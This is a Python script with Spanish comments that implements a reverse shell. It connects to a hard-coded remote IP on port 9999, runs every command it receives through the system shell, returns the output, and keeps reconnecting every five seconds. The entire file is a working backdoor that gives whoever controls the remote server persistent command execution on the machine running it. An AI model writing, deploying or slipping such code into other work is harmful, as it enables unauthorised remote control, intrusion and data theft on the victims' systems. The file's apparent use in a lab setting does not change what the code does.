import socket
import subprocess
import time

def run_command(command):
    """Ejecuta el comando del sistema y devuelve la salida o error.

    Args:
        command (str): El comando del sistema a ejecutar.

    Returns:
        str: La salida del comando si se ejecuta correctamente, 
             de lo contrario, un mensaje de error.
    """
    try:
        # Usar Popen para capturar salida estándar y error
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            return stdout
        else:
            return f"Error: {stderr}"
    except Exception as e:
        return str(e)

def main():
    """Función principal que maneja la conexión al servidor remoto y 
    la ejecución de comandos recibidos.
    """
    host = '192.168.138.134'  # IP del servidor remoto
    port = 9999  # Puerto del servidor remoto

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((host, port))
                print("Conexión establecida con el servidor remoto")

                while True:
                    data = sock.recv(1024)
                    if not data:
                        break

                    command = data.decode().strip()
                    if command.lower() == 'exit':
                        break

                    response = run_command(command)
                    sock.sendall(response.encode())

        except Exception as e:
            print(f"Error: {e}")
            print("Intentando reconectar en 5 segundos...")
            time.sleep(5)  # Espera antes de intentar reconectar

if __name__ == "__main__":
    main()